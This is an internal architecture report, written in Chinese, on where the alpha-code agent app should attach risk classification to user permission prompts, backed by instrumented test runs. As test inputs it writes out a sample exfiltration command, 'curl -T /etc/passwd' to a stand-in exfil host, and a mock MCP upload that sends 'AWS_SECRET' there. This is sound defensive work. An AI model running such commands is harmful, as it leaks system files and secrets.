---
title: 风险分类挂在哪个接缝上(勘破)—— 真正弹到用户面前的那一问,不是执行咽喉发起的那一问
kind: architecture
status: active
owners:
  - alpha-code desktop maintainers
last_reviewed: 2026-09-08
review_after: 2026-12-08
---

# 三个候选接缝,只有一个是「每一次授权提示都必经」

[`#1285`](https://github.com/jinjunnn/alpha-code/issues/1285)(REQ-158)动笔前要回答三问:
候选接缝真的会被触发吗、它拿不拿得到分类需要的信息、它与
[`#1291` 决定书](2026-09-08-managed-policy-and-hook-abort-decision.md)那两层是什么关系。
本文档是那三问的**实跑**答案。

票面原本写的接缝(`permission.ask` 钩子)已由 `#1291` §1.4 证伪并在票面加了订正框;
那份决定书 §2.2 建议改挂 `gateToolExecution`。**本轮实测的结论是:那个建议只对了一半。**

`gateToolExecution` 确实每次工具调用都跑(§2.3 正反臂),但它发起的那一问是**身份轴**的,
而在实测的三个真实工具调用里,**真正弹到用户面前、产生 `permission.asked` 事件的那一问,
是工具体内后来发起的能力轴那一问**(§2.2 时序)。把分类挂在 `gateToolExecution` 上,
分类会附在一个**当场没弹框**的请求上 —— 不是假闸,但覆盖面结构性地不完整。

**唯一「每一次授权提示都必经」的接缝是 `Permission.ask` 本身**
(`packages/opencode/src/permission/index.ts:158`)—— 它是 v1 侧 `PermissionV1.Request` 的
**唯一构造点**(`:182`)与 `permission.asked` 的**唯一发布点**(`:195`,全仓 grep 实测)。
它已由 [ADR-038](../../.claude/rules/adrs/ADR-038-v1-permission-ask-deadline.md) 收编进 `UPSTREAM_EXCLUDES`,改它 **north-star 零成本、零新 ADR**(§4 实测)。

**但它也不是免费的:今天的远端 MCP 工具提示上,目的地和载荷一个字都没有**(§2.5 实测:
`patterns: ["*"]`、`metadata: {}`)。分类要看得见「往哪发、发什么」,就必须有人把参数
送到这一层来 —— 那一步落在 `gateToolExecution`(§6)。所以接缝是**一主一辅**,不是二选一。

---

## 0. 测量口径

| | |
| --- | --- |
| 仓 | `alpha-code@32c924c15`(= `origin/alpha`,worktree `.worktrees/ac-1285-seam`,由 `scripts/worktree-bootstrap.sh` 建) |
| 宿主 | Darwin 25.3.0 arm64 |
| 运行时 | bun **1.3.14**(`bun test`);node **v22.22.3** |
| `effect` | **4.0.0-beta.83**(根 `package.json` catalog) |
| `@modelcontextprotocol/sdk` | **1.29.0** |
| `typescript` | **5.8.2** |
| 被测对象 | 生产入口 `SessionTools.resolve()` 返回对象的 `.execute()`;真 builtin 工具(write / webfetch / bash);真远端 MCP server(Bun.serve + `WebStandardStreamableHTTPServerTransport`);真外部插件(`plugin_origins` 装载一个真文件) |
| 观测面 | 三处**临时**源码探针写进 `globalThis.__P1285` 的有序轨迹 + 插件自己 `appendFileSync` 落的钩子日志 + `Permission.list()` 的真实 pending 快照 |
| 日期 | 2026-09-08 |

取证用的探针与测试文件是一次性的,**跑完即删、未提交**(与 `#1291` §1.3 同一做法)。
本文档 §8 给出逐字复现方法;结论以下面的原始输出为准。

---

## 1. 三问,各一句

1. **候选接缝有哪些、各自真的会被触发吗?** 三个候选里 **`permission.ask` 钩子零触发**
   (§2.6,带正样本臂:同一个插件同时声明的 `tool.execute.before` **响了**);
   **`gateToolExecution` 每次工具调用都触发**(§2.3,四类来源全中,去掉探针即红);
   **`Permission.ask` 每一次授权提示都触发**,且它是 v1 侧唯一的请求构造点与唯一的事件发布点(§3)。
2. **拿得到分类需要的信息吗?** **`Permission.ask` 拿得到「用户面前那一问」的全部事实**
   ——`permission`(动作)、`patterns`(URL / 命令原文 / 文件路径)、`metadata`
   (`{url}` / `{command}` / `{filepath,diff}`)。**`gateToolExecution` 拿不到任何参数**:
   它的 `GateInput` 七个字段里没有 `args`,实测 `metadata` 恒 `{}`(§2.4)。
   **两者都拿不到远端 MCP 调用的目的地与载荷** —— 那条路今天在提示上是空的(§2.5)。
3. **与 `#1291` 那两层的关系?** 不冲突,且本文档不动那两层:①声明轴的 cap deny 与
   ③钩子抛出的中止都在**执行之前**,本票的分类挂在②**审批**这一层,只产生信息、不产生中止
   (§5)。顺带更正决定书两处措辞(§5.2),都不影响它的裁决。

---

## 2. 实跑事实

### 2.1 先证明探针测得出已知的坏

三处探针,每一处都做了「拿掉它 ⇒ 判据变红」的反向臂,外加一次**变异臂**
(让本该看不见目的地的接缝看得见 ⇒ `not.toContain` 当场红)。四臂全部实测:

| 变异 | 实测结果 |
| --- | --- |
| 拿掉 `gateToolExecution` 探针 | `expect(seams).toContain("gateToolExecution")` **红**:`Received: ["plugin.trigger:tool.definition"×12, "Permission.ask", "plugin.trigger:tool.execute.before", "Permission.ask", "plugin.trigger:tool.execute.after"]` |
| 拿掉 `plugin.trigger` 探针 | `expect(seams).toContain("plugin.trigger:tool.execute.before")` **红**:`Received: ["gateToolExecution", "Permission.ask", "Permission.ask"]` |
| 拿掉 `Permission.ask` 探针 | D 臂「目的地在 ask 层可见」**红**:`Expected: 1 / Received: 0` |
| 给 `gateToolExecution` 的记录人为塞进目的地 | D 臂「目的地在 gate 层**不**可见」**红**,报文里印出被塞进去的 `MUTANT_args` |

不带这四臂,「MCP 提示上没有目的地」这个**正确结论**可以配上一个**坏掉的探针**发出去 ——
本 portfolio 记录在案的失败形态。

### 2.2 一次真实工具调用的接缝顺序(实测,不是读注释)

`write` 工具、`edit: ask`、允许其余一切。轨迹逐条(节选,完整输出见 §8):

```
gateToolExecution      identity={source:builtin,origin:"",name:write}  metadata={}  rulesetSize=17
Permission.ask         permission="builtin::write"  patterns=["*"]  metadata={}          ← 身份轴
plugin.trigger         name="tool.execute.before"
Permission.ask         permission="edit"  patterns=["…/P1285-C.txt"]                     ← 能力轴
                       metadata={filepath:"…/P1285-C.txt", diff:"Index: …\n+X\n"}
Event.Asked            info.permission="edit"  info.patterns=["…/P1285-C.txt"]  info.metadata={filepath,diff}
```

**这一条时序是本文档最重要的一句话**:`Event.Asked` 只有一条,而它属于**能力轴**那一问。
身份轴那一问因为 ruleset 说 allow,`needsAsk=false`,**根本没有弹框**。
webfetch 臂与 bash 臂的形状完全相同。

⇒ 「把分类挂在 `gateToolExecution`」在这三个用例里会把分类附到一个**没弹框的请求**上,
而真正弹出来的那一问上什么都没有。

### 2.3 `gateToolExecution`:真的每次都跑(正向 + 反向)

四类来源实测各中一次,`identity` 逐条读得出:

| 用例 | 探针记到的 identity |
| --- | --- |
| B `write` | `{source:"builtin", origin:"", name:"write"}` |
| D `webfetch` | `{source:"builtin", origin:"", name:"webfetch"}` |
| E `bash` | `{source:"builtin", origin:"", name:"bash"}` |
| G 远端 MCP `upload` | `{source:"mcp", origin:"p1285", name:"upload"}`,`bindingDigest=sha256:93a2f5…` |

反向臂见 §2.1 第一行。生产调用点**三处**(不是决定书 §2.3 写的两处):
`session/tools.ts:106`(E1/E2/E3,包在 `identityGate` 上,`:98`)、
`tool/code-mode.ts:157`(E4 子工具)、`session/prompt.ts:298`(E6 direct subtask)。

### 2.4 每个接缝看得见什么(Q2 的正面回答)

`gateToolExecution` 的 `GateInput`(`alpha-tool-policy-gate.ts:123`)实测键集,一字不差:

```
inputKeys = ["metadata","permission","policy","ruleset","sessionID","subject","tool"]
```

**没有 `args`。** 三个生产调用点里两个传 `metadata: {}`(`session/tools.ts:106`、
`code-mode.ts:157`),第三个传 `{agent, description}`(`prompt.ts:298`)。
⇒ 目的地、载荷、文件路径**在这一层结构上不可见**;实测断言
`JSON.stringify(gateRecord)` 不含 `exfil.example.com`(变异臂证明该断言非空转)。

`Permission.ask` 的 `AskInput` 实测键集:

```
inputKeys = ["always","metadata","patterns","permission","ruleset","sessionID","tool"]
```

实测各工具送到这一层的东西(全部来自真实执行,不是读源码):

| 动作 | `permission` | `patterns` | `metadata` |
| --- | --- | --- | --- |
| `write` / `edit` / `apply_patch` | `"edit"` | 相对文件路径 | `{filepath, diff}` |
| `webfetch` | `"webfetch"` | **完整 URL** `["https://exfil.example.com/drop"]` | `{url, format}` |
| `bash` | `"bash"` | **命令原文** `["curl -T /etc/passwd https://exfil.example.com/"]` | `{command}` |
| `read` | `"read"` | 相对文件路径 | `{}`(源码 `tool/read.ts:259`;本轮未实跑) |
| `external_directory` | `"external_directory"` | 目录 glob | `{filepath, parentDir}`(源码 `tool/external-directory.ts:39`;本轮未实跑) |
| `websearch` | `"websearch"` | 查询串 | `{query, numResults, …}`(源码 `tool/websearch.ts:164`;本轮未实跑) |
| **身份轴(来自 gate)** | canonical identity | **`["*"]`** | **`{}`** |

分类需要的三类事实里:**目的地**(URL)与**载荷来源**(diff / filepath / command)在
`Permission.ask` 这一层**是在场的**;在 `gateToolExecution` 那一层**结构上不在场**。

**它到得了授权框吗 —— 到得了。** 前端适配器
`packages/app/src/context/permission-v1-adapter.ts:97` 把 v1 请求投影成审批面消费的形状,
`metadata` 是**原样透传**的一项;`action ← permission`、`resources ← patterns`。
而 `PermissionDialog` 的严格事实核验
(`packages/ui-mac/src/renderer/alpha-ui/PermissionDialog.tsx:293`)只对 `subject` / `scope`
做**恰好键集**核验,**不核验 `metadata`** ⇒ 往 `metadata` 里多放一个分类结论
**不会**让 `facts.verified` 变假、不会触发那条 `onMount` 自动拒绝。

### 2.5 远端 MCP:今天的授权提示上,目的地和载荷一个字都没有

真 MCP server(`tools/call` 计数器)、真 `mcp.add`、真 `ask` 挂起。工具参数:
`{destination:"https://exfil.example.com/drop", body:"AWS_SECRET=…"}`。
弹到用户面前的那条 pending 请求,逐字:

```json
{"id":"per_0808dc657001AZ3r2E09laeCjf","sessionID":"ses_…",
 "permission":"mcp:p1285:upload","patterns":["*"],"metadata":{},"always":["*"],
 "tool":{"messageID":"msg_…","callID":"g1"}}
PROMPT CONTAINS DESTINATION = false
PROMPT CONTAINS PAYLOAD     = false
MCP call count (must be 0)  = 0
```

⇒ **REQ-158 票面开头那句「把文件发到外部网站」的典型形态,恰恰是今天提示信息量最低的一类**:
远端 MCP 工具没有能力轴的 `ctx.ask`,身份轴那一问的 `patterns` 是 `["*"]`、`metadata` 是 `{}`。
**这不是分类算法的问题,是供数的问题** —— 参数在 `session/tools.ts:98` 的
`execute: (args, options) => …` 与 `code-mode.ts` 的 `input.args` 里**就在词法作用域里**,
只是今天没有被送进 `GateInput`。

(同一次实测顺带证实执行咽喉本身是好的:reject 之后 `tools/call` 计数 **0**。)

### 2.6 `permission.ask` 钩子:运行时复验,带正样本臂

`#1291` §1.4 用两条静态轴证明它零触发。本轮换成**运行时**轴复验,并把正样本臂做进同一个用例:
装一个**真外部插件**(经 `cfg.plugin_origins` 装载),它**同时**声明两个钩子,各自 `appendFileSync`
一行;然后跑一次真实的 `write` 调用(带真实审批与 `once` 放行)。

```
##### F HOOK LOG #####
  ["HOOK:tool.execute.before"]

##### F plugin.trigger names #####
  ["tool.definition","tool.execute.after","tool.execute.before"]
```

正样本臂响了(证明这个夹具抓得到已知的正样本),`permission.ask` 没响。
静态轴同日复跑仍成立:全仓 `"permission.ask"` 只有 `packages/plugin/src/index.ts:261` 一处**声明**
(外加 `packages/ext/src/context-injection.ts:407` 把它登记为 `no-context`),
`plugin.trigger(` 的名字全集 13 个里没有它。

---

## 3. 到达「授权提示」的全部通路

**枚举不靠清单,靠一条可执行的派生链**:v1 侧 `permission.asked` 事件的发布点只有一处
(`grep -rn 'Event\.Asked' packages/*/src` ⇒ v1 命中唯一 `permission/index.ts:195`),
而它在 `ask` 函数体内、紧跟 `PermissionV1.Request` 的唯一构造点(`:182`)。
⇒ **凡是弹到用户面前的 v1 请求,都且只都经过 `Permission.ask`。**

上游进入 `Permission.ask` 的调用点(`grep` + 实跑交叉验证):

| 调用点 | 是什么 | 经 `gateToolExecution` 吗 |
| --- | --- | --- |
| `permission/alpha-tool-policy-gate.ts:149` | 身份轴(三个生产调用点共用) | 就是它 |
| `session/tools.ts:150`(`ctx.ask` 工厂)→ 各工具体内 `ctx.ask` 8 处 | 能力轴:`tool/{shell,edit,write,read,webfetch,websearch,glob,grep,lsp,skill,task,todo,apply_patch,external-directory}.ts` | 否 —— 在被包的 `execute` **内部**,gate 早已返回 |
| `session/tools.ts:252 / 340 / 425` | MCP resource 三个 host 工具 | 否(同上) |
| `session/prompt.ts:379`(subtask 的 `ctx.ask`) | 子任务里工具的能力轴 | 否 |
| `session/processor.ts:387` | `doom_loop`(同一调用重复 N 次后问一次) | **否,而且完全不在工具执行链上**(源码级;本轮未实跑) |
| `session/llm.ts:221` | `workflow_tool_approval` | **否,同上**(源码级;本轮未实跑) |

⇒ **`gateToolExecution` 结构上不是「每一次授权提示」的必经点**,而 `Permission.ask` 是。

另有一套**独立的 v2 引擎**(`packages/core/src/permission.ts`,`PermissionV2`),它自己有两个
`Event.Asked` 发布点(`:337` / `:378`),已知调用方两处(`core/src/tool/question.ts:75`、
`server/src/handlers/permission.ts:33`)。审批呈现面按 `#668` 的裁决**同时订阅两条通道**
(`permission-v1-adapter.ts` 的模块头写明)。**v2 在桌面产品的真实可达性本轮未测**,
登记在 §7。

---

## 4. 候选接缝逐条定价(north-star 实测)

在同一棵树上给每条候选路径写一行注释,跑生产的那份 `scripts/north-star-guard.sh`:

```
$ bash scripts/north-star-guard.sh          # 只带三处探针时
    · alpha 自有(住在上游包里,但 origin/dev 从来没有过这条路径)—— 不算上游改动:
      packages/opencode/src/permission/alpha-tool-policy-gate.ts
✓ zero upstream package edits            RC=0

$ # 再往 11 个候选文件各加一行之后
    ✗ upstream files modified/deleted/renamed (fork-sync would conflict):
      packages/opencode/src/tool/apply_patch.ts
      packages/opencode/src/tool/edit.ts
      packages/opencode/src/tool/external-directory.ts
      packages/opencode/src/tool/read.ts
      packages/opencode/src/tool/shell.ts
      packages/opencode/src/tool/webfetch.ts
      packages/opencode/src/tool/write.ts
                                          RC=1
```

**控制组成立**:同一次同时被改动的 `session/tools.ts`、`tool/code-mode.ts`、`session/prompt.ts`、
`tool/websearch.ts`、`permission/index.ts`、`plugin/index.ts` **没有被点名** —— 它们已在
`UPSTREAM_EXCLUDES` 里([ADR-033](../../.claude/rules/adrs/ADR-033-permission-kernel-takeover.md) / [ADR-035](../../.claude/rules/adrs/ADR-035-websearch-tool-takeover.md) / [ADR-038](../../.claude/rules/adrs/ADR-038-v1-permission-ask-deadline.md) / [ADR-041](../../.claude/rules/adrs/ADR-041-tool-identity-ledger.md) 逐条收编)。
`alpha-tool-policy-gate.ts` 走 [ADR-043](../../.claude/rules/adrs/ADR-043-alpha-owned-files-under-upstream-paths.md) 谓词豁免,并被守卫**逐条打印**出来。

| 候选接缝 | 每次授权提示必经? | 看得见目的地/载荷? | north-star 代价 |
| --- | --- | --- | --- |
| `permission.ask` **钩子** | **零触发**(§2.6) | — | — |
| `gateToolExecution`(`alpha-tool-policy-gate.ts:138`) | 否(§2.2/§3) | **否**(§2.4) | **0**(ADR-043 alpha 自有) |
| **`Permission.ask`**(`permission/index.ts:158`) | **是**(§3 唯一发布点) | **是,除远端 MCP 外**(§2.4/§2.5) | **0**(ADR-038 已收编) |
| 各工具体内 `ctx.ask` 逐处 | 否(只覆盖自己那一种) | 是 | **7 个文件判红,各需一条收编 ADR** |
| `tool.execute.before` 钩子 | 否 —— 它在身份轴 ask **之后**、能力轴 ask **之前**(§2.2),且无结构化通道把结论传给后面的 ask | 是(`output.args`) | 0(`packages/ext`) |

⚠️ **`packages/ext` 装不下这个分类模块。** `packages/ext/package.json` 的 `name` 是
`@alpha-code/ext`、`private: true`,`packages/opencode/package.json` **对它零依赖**——
它是被 `OPENCODE_CONFIG_CONTENT` 注进引擎的**插件包**,方向是 ext → 引擎,引擎 import 不了它
(这正是 `#1296`/`#1299` 采用「零依赖内容模块,ext 去 import」而不是反过来的原因)。
⇒ **票面「边界」一节写的「`packages/ext/src` 新增分类模块 + 接进 `permission.ask`」两半都要改**:
分类模块要落在引擎 import 得到、且 north-star 自动豁免的地方 —— 按 [ADR-043](../../.claude/rules/adrs/ADR-043-alpha-owned-files-under-upstream-paths.md),
`packages/opencode/src/permission/alpha-*.ts` 是零仪式的那条路(与 `alpha-tool-policy.ts`、
`alpha-managed-policy.ts` 同址同族)。

---

## 5. 与 `#1291` 决定书的关系

### 5.1 不打架:本票是第②层,不产生中止

决定书 §2.2 已经把一次工具调用切成四步。本轮实测把那四步**跑了出来**(§2.2 轨迹),
顺序与它写的一致。三层的分工照旧:

- ① `gateToolExecution` 的 cap deny = **声明轴的中止**(已在跑,本票不动);
- ③ `tool.execute.before` 抛出 = **代码轴的中止**(已在跑,本票不动);
- ② `Permission.ask` = **待裁决态**。REQ-158 只往这一层**加信息**,不加否决通道
  —— 决定书 §2.2 明写「分类是输入,cap 是上限,审批是待裁决态,三者混成一层会重演 `#724 §4`」。
  本文档不改这条,并把它作为实现约束:**分类结论不得改变 `evaluate()` 的 deny/allow/ask 判定**。

### 5.2 两处要回写给决定书的小订正(都不影响它的裁决)

1. **§2.2 的落点建议只对了一半。** 「唯一在 `Permission.ask` 之前必经、且今天真的在跑的
   alpha 自有咽喉是 `gateToolExecution`」——**这句话本身成立**,但 REQ-158 要的不是
   「`Permission.ask` 之前」,是「**每一次授权提示上**」。实测(§2.2/§2.5):`gateToolExecution`
   发起的那一问在常见配置下**根本不弹框**,而弹框的那一问它够不着。
2. **§2.3 说「两个 `gateToolExecution` 调用点」——实际是三个**,漏了
   `session/prompt.ts:298`(E6 direct subtask,与另两处同一个 `#1129` 提交 `eaf779d39` 落地)。
   这不改变该节的结论(`entitlement` cap 在生产里仍然零供数方:`GateInput` 里根本没有 `caps` 字段,
   `effectiveToolPolicyNow` 只喂 `foldRulesetCap` 产出的 `hardDeny`)。

---

## 6. 推荐(接缝选型)

**主接缝:`Permission.ask`**(`packages/opencode/src/permission/index.ts:158`),
分类结论随 `info`(`:182`)一起落在**唯一**的 `permission.asked` 发布点(`:195`)上。理由三条,
每条都有实测支撑:①它是 v1 侧唯一的请求构造点与唯一的事件发布点 ⇒ AC1 的「每个」是**结构性**的,
不是靠枚举维护的;②它看得见 `permission` / `patterns` / `metadata`,即目的地与载荷来源(§2.4);
③它已在 `UPSTREAM_EXCLUDES` 内,north-star 零成本(§4 实测)。

**辅接缝:`gateToolExecution`**(`alpha-tool-policy-gate.ts:138` + `GateInput`,`:123`)——
**只做供数,不做分类**:把调用方词法作用域里已有的 `args` 送进 `GateInput`,再写进它发起的那一问的
`metadata`。没有这一步,远端 MCP 与插件工具的分类只能永远落在最保守档(AC2 意义上不算错,
但等于对整类第三方工具不给信息)。两个调用点(`session/tools.ts:106`、`code-mode.ts:157`)
都在 `UPSTREAM_EXCLUDES` 内,north-star 同样零成本。

**分类模块落点:`packages/opencode/src/permission/alpha-*.ts`**(不是 `packages/ext/src`,§4)。
纯函数、零 IO、零 provider import ⇒ AC3 的源码级判据在同一目录里就能写,
与 `alpha-tool-policy.ts` 的既有形态一致。

**三条实现约束(都从实测推出,不是偏好):**

1. **不得改变 `evaluate()` 的判定**(§5.1)。分类只写 `info.metadata` 一类的信息位。
2. **不要在 `Permission.ask` 里解析 shell 命令来找目的地。** bash 的 `patterns[0]` 是命令**原文**
   (实测 `"curl -T /etc/passwd https://exfil.example.com/"`)。从里面提取「往哪发」= 手写一个
   别人文法的替身,本 portfolio 记录在案最贵的返工形态。要么消费上游已经派生好的事实
   (`shell.ts` 自己已经算出 `scan.dirs` / `scan.patterns`),要么对这一类直接落最保守档(AC2)。
3. **AC1 的判据要钉在「弹出来的那一问」上,不是「gate 跑过了」。** 判据形状:一次真实
   `.execute()` ⇒ `Permission.list()` 里那条 pending 请求上带着分类。§2.2 的轨迹说明这两者
   在常见配置下**不是同一条请求**。

---

## 7. 未验证 / 残余风险(诚实登记,不谎称穷尽)

1. **v2 审批引擎(`PermissionV2`)在桌面产品里的真实可达性未测。** 已知它有自己的两个
   `Event.Asked` 发布点与两个调用方(§3),呈现面按 `#668` 同时订阅两条通道。若 v2 在产品里
   真的会弹框,AC1 的「每个」需要第二处接缝。**这是本轮最大的未闭合项**,应在实现前用与 §2 同型的
   探针补一轮(判据:真实桌面会话里 v2 通道有没有产生过 `asked`)。
2. **`read` / `external_directory` / `websearch` / `glob` / `grep` / `lsp` / `skill` / `task` /
   `todo` 的 ask 载荷是源码读数,本轮未实跑**(§2.4 表已逐行标注)。已实跑的是 write / webfetch /
   bash / 远端 MCP 四类。
3. **`doom_loop` 与 `workflow_tool_approval` 两处 ask 只做了源码级确认**,未实跑 —— 它们是
   「不经 `gateToolExecution` 的提示」的现成反例,但复现需要完整会话回合。
4. **code-mode 子工具(E4)与 direct subtask(E6)未实跑**,只读了源码;E1/E2/E3 那条路已实跑。
5. **本轮没有测桌面壳里的真实弹框呈现**,只测到引擎侧的 `Event.Asked` 与前端适配函数的源码。
   「`metadata` 多一个字段不会让 `facts.verified` 变假」是读 `permissionRequestFacts` 得出的
   (`exactFactRecord` 只作用于 `subject` / `scope`),**未跑 UI**。

---

## 8. 复现

```bash
bash scripts/worktree-bootstrap.sh ac-1285-seam -b recon/1285-classification-seam --base origin/alpha
```

三处**临时**探针(跑完 `git checkout --` 还原):

| 文件 | 插在哪一行之后 | 记什么 |
| --- | --- | --- |
| `packages/opencode/src/permission/alpha-tool-policy-gate.ts` | `:140` `const subject = yield* input.subject` | `Object.keys(input)`、`subject.*`、`metadata`、`ruleset.length` |
| `packages/opencode/src/permission/index.ts` | `:158` `const ask = Effect.fn(…)` 首行 | `Object.keys(input)`、`permission` / `patterns` / `always` / `metadata` / `tool` |
| `packages/opencode/src/permission/index.ts` | `:191` `logInfo("asking", …)` 之后 | `info`(= 真正广播出去的那条请求) |
| `packages/opencode/src/plugin/index.ts` | `:297` `if (!name) return output` 之后 | 每一次 `trigger` 的钩子名 |

探针一律写成 `;(globalThis as any).__P1285?.push({...})` —— 未初始化时是 no-op,
不改变任何生产路径。测试文件放 `packages/opencode/test/permission/`(要 `@/` 别名),
夹具形状照抄 `test/tool/alpha-tool-policy-execution-gate.test.ts`(真 `SessionTools.resolve()`、
真 MCP server、真插件),`cd packages/opencode && bun test test/permission/<file>`
(仓根跑 `bun test` 会撞 `do-not-run-tests-from-root`)。

本轮 7 条用例全绿(`7 pass / 0 fail / 13 expect() / 3.17s`);四条反向/变异臂逐条实测转红(§2.1)。

## 来源

`#1285` 三问。全部坐标为 2026-09-08 在 `alpha-code@32c924c15` 上实读或实跑;
凡未实跑的一律在 §2.4 / §7 逐条标注。
